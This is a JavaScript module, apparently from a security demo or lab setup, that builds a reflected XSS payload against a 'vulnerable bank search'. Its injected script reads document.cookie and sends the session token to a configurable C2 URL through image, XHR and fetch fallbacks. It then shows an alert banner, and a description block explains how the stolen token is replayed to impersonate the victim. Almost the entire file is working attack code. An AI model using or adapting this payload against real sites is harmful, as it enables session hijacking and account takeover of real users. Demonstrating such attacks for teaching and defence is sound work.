/**
 * Vector A — Session Cookie Theft (Exfiltration)
 *
 * Technical Mechanism:
 *   1. Reflected <script> executes within the vulnerable origin.
 *   2. Reads the victim's active session token dynamically via document.cookie.
 *   3. Exfiltrates the real token to the Attacker C2 server via multiple channels.
 *   4. Enables the attacker to hijack the session.
 */

function generatePayload(c2Url = 'http://127.0.0.1:5002') {
  return `<script>
(function() {
  var stolen = document.cookie || 'sessionid=UNAUTHENTICATED_GUEST';
  var encoded = encodeURIComponent(stolen);
  var sent = false;
  try { new Image().src = '${c2Url}/log?data=' + encoded; sent = true; } catch(e) {}
  if (!sent) { try { var x = new XMLHttpRequest(); x.open('GET', '${c2Url}/log?data=' + encoded, true); x.send(); sent = true; } catch(e) {} }
  if (!sent) { try { fetch('/log?data=' + encoded).catch(function(){}); } catch(e) {} }

  var t = document.createElement('div');
  t.style = 'position:fixed;bottom:20px;left:20px;padding:12px 18px;background:#b91c1c;color:#fff;border-radius:8px;box-shadow:0 10px 15px rgba(0,0,0,0.3);font-family:sans-serif;font-size:13px;font-weight:600;z-index:999999;';
  t.innerHTML = '🚨 [Vector A Triggered] Cookie exfiltrated: ' + (document.cookie ? 'sessionid=...' : '(empty cookie)');
  document.body.appendChild(t);
  setTimeout(function() { t.remove(); }, 4000);
})();
</script>`;
}

const payload = generatePayload('http://127.0.0.1:5002');
const encodedPayload = encodeURIComponent(payload);

const description = `
Vector A — Session Cookie Theft
================================
1. Attacker crafts a malicious reflected URL pointing to the vulnerable bank search.
2. The URL contains an injected script targeting the Attacker C2 Listener.
3. Victim opens the link in their browser while authenticated.
4. Browser executes the script; document.cookie is read and sent to Laptop 1 (Attacker).
5. Attacker captures the real session token and replays it to impersonate the victim.
`;

module.exports = {
  name: 'Vector A — Session Hijacking',
  payload,
  encodedPayload,
  generatePayload,
  description
};
